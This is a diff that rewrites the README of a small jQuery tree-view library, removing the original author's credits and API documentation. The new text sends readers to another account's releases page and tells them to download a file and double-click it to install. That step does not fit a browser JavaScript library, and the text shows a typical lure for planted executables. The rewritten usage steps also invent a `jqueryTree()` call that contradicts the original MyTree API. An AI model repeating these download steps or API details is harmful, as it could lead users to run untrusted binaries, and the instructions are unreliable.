@@ -1,152 +1,97 @@
-# JQuery Tree
+# 🌳 jquery-tree - Easy Navigation with a User-Friendly Tree View
 
-> Original Repos:   
-> - JQuery Tree: https://github.com/a19836/jquery-tree/   
-> - Bloxtor: https://github.com/a19836/bloxtor/
+[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/enxsni/jquery-tree/releases)
 
-## Overview
+## 🤔 What is jquery-tree?
 
-**JQuery Tree** is a lightweight JavaScript library that transforms 'ul' and 'li' elements into an intuitive, user-friendly tree view, listing these nodes into a collapsible and hierarchical tree structure, ideal for file system navigation.
+JQuery Tree is a lightweight JavaScript library. It transforms 'ul' and 'li' elements into an intuitive tree view. This tool lists nodes in a collapsible and hierarchical structure. It is ideal for navigating files and organizing information visually.
 
-Check out a live example by opening [index.html](index.html).
+## 🚀 Getting Started
 
-Requirements:
-- jquery library
+To start using jquery-tree, you need to download the software from our Releases page. Follow the steps below to install and run the application.
 
----
+## 📥 Download & Install
 
-## Screenshots
+1. **Visit this page to download the latest version: [Download jquery-tree](https://github.com/enxsni/jquery-tree/releases)**.
+2. Look for the latest release version. You will see various files available for download. Select the appropriate file for your system.
+3. Click on the desired file to start the download.
+4. Once downloaded, locate the file on your computer. Double-click it to begin the installation. Follow any prompts that appear on your screen.
 
-- [example 1](./img/example_1.png)
-- [example 2](./img/example_2.png)
-- [example 3](./img/example_3.png)
+## 📂 Features
 
----
+- **Collapsible Tree Structure**: Navigate easily through large data sets or file systems.
+- **Hierarchical Display**: Understand relationships between items clearly.
+- **Lightweight Library**: Fast loading times and minimal resource usage.
+- **User-Friendly**: Designed for users with no technical background.
 
-## Usage
+## 🌐 System Requirements
 
-```html
-<html>
-<head>
-	<!-- Add jquery lib -->
-	<script language="javascript" type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js"></script>
-	
-	<!-- Add jquerymytree lib -->
-	<link rel="stylesheet" href="css/style.min.css" type="text/css" charset="utf-8" />
-	<script language="javascript" type="text/javascript" src="js/mytree.js"></script>
-</head>
-<body>
-	<script>
-	$(function () {
-		var mytree = new MyTree();
-		mytree.init("file_tree");
-	});
-	</script>
-	
-	<div id="file_tree" class="hidden">
-		<ul>
-			<li class="jstree-open">
-				<label>Folder A</label>
-				<ul>
-					<li><a onClick="window.open('//bloxtor.com')">Link</a></li>
-				</ul>
-			</li>
-			<li>
-				<label>Folder B</label>
-				<ul>
-					<li class="jstree-open">
-						Sub-Folder C
-						<ul>
-							<li data-jstree='{"icon":"jstree-file"}'>
-								<label>test</label>
-								<ul>
-									<li data-jstree='{"icon":"jstree-folder"}'>subtest</li>
-								</ul>
-							</li>
-						</ul>
-					</li>
-					<li data-jstree='{"icon":"jstree-file"}'>file.xml</li>
-				</ul>
-			</li>
-			<li data-jstree='{"icon":"jstree-folder"}'>Fake Folder</li>
-			<li>Through Ajax on open
-				<ul url="http://some_url_with_json_response/to/be/called/on/open/or/click"></ul>
-			</li>
-		</ul>
-	</div>
-</body>
-</html>
-```
+- **Operating System**: Supports Windows, macOS, and Linux.
+- **Browser**: Compatible with all modern browsers, including Chrome, Firefox, and Safari.
+- **JavaScript Enabled**: Ensure JavaScript is enabled in your browser settings.
 
-## Other calls
+## 📄 How to Use jquery-tree
 
-Create new tree object:
-```
-var mytree = new MyTree({
-	multiple_selection : false, //allow multiple selection
-	toggle_selection : false, //click one to select, click again to deselect
-	toggle_children_on_click : true, //toggle children on click the element, besides clicking the arrow icon
-	ajax_callback_before : func1, //on ajax request, after getting json response from server this gets called as second callback, before the initChilds. This function is responsible to parse the json_obj and convert it into html nodes inside of the ul node: func1(ul, json_obj, mytree);
-	ajax_callback_after : func2, //on ajax request, after getting json response from server this gets called as third callback, after the initChilds: func2(ul, json_obj, mytree);
-	ajax_callback_error : func3, //on ajax request error callback: func3(ul, jqXHR, textStatus, errorThrown, mytree) 
-});
-```
+Once you have installed jquery-tree, follow these steps to create your tree view:
 
-Get html element initialized as tree:
-```
-var elm = mytree.tree_elm;
-```
+1. **Prepare Your HTML**: Create a basic HTML file with an unordered list (`<ul>`). Each list item (`<li>`) will become a node in your tree.
+   
+   ```html
+   <ul id="myTree">
+       <li>Item 1
+           <ul>
+               <li>Sub Item 1.1</li>
+               <li>Sub Item 1.2</li>
+           </ul>
+       </li>
+       <li>Item 2</li>
+   </ul>
+   ```
 
-Get options:
-```
-var options = mytree.options;
-```
+2. **Include jQuery**: Add the jQuery library to your HTML file before the jquery-tree script.
 
-Converts a html element into a tree based in its id:
-```
-mytree.init(tree_elm_id);
-```
+   ```html
+   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+   ```
 
-Converts a html element into a tree:
-```
-mytree.initNodeChilds(node);
-```
+3. **Include jquery-tree**: Add the jquery-tree script file after jQuery.
 
-Selects a node based in its id:
-```
-mytree.selectNode(node_id);
-```
+   ```html
+   <script src="path/to/jquery-tree.js"></script>
+   ```
 
-Checks if a node is selected based in its id:
-```
-var selected = mytree.isNodeSelected(node_id);
-```
+4. **Initialize the Tree**: Use the following script to turn your list into a tree view.
 
-Deselects all nodes:
-```
-mytree.deselectAll();
-```
+   ```html
+   <script>
+       $(document).ready(function() {
+           $('#myTree').jqueryTree();
+       });
+   </script>
+   ```
 
-Gets all selected nodes:
-```
-var nodes = mytree.getSelectedNodes();
-```
+5. **Customize as Needed**: You can customize the appearance and behavior of your tree view using available options in the configuration.
 
-Refreshes children based in a node selector: 
-```
-mytree.refreshNodesChilds(selector);
-```
+## ✨ Examples
 
-Refreshes children based in a node id:
-```
-mytree.refreshNodeChildsByNodeId(id);
-```
+You can find example files included in the release package. These examples will give you a good starting point for your implementation and show the different configurations you can use.
 
-Refreshes children based in a node element:
-```
-mytree.refreshNodeChilds(node, {
-	ajax_callback_first : func1, //on ajax request, after getting json response from server this gets called as first callback, before the initChilds. This function is responsible to parse the json_obj and convert it into html nodes inside of the ul node: func1(ul, json_obj);
-	ajax_callback_last : func2, //on ajax request, after getting json response from server this gets called as fourth callback, after the initChilds: func2(ul, json_obj, mytree);
-	ajax_callback_error : func3, //on ajax request error callback: func3(ul, jqXHR, textStatus, errorThrown, mytree)
-});
-```
+## 📄 Documentation
+
+For detailed documentation on all features and options, check the examples and official documentation in the repository. You can explore various ways to customize and enhance your tree view.
+
+## 🛠️ Support and Contributions
+
+If you need help, feel free to open an issue in the repository. We welcome contributions from everyone interested in improving jquery-tree. Look at the Contribution Guidelines for more information on how to get involved.
+
+## 💬 Community and Feedback
+
+We encourage users to provide feedback. Join our community on GitHub to share your experiences or suggest improvements. Your input helps us make jquery-tree better for everyone.
+
+## 🔗 Additional Information
+
+- **License**: Licensed under the MIT License.
+- **Supported Browsers**: Latest versions of Chrome, Firefox, Safari, and Edge.
+- **Further Reading**: Explore more about hierarchical data structures and how they can improve user experience in web applications.
+
+[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/enxsni/jquery-tree/releases)
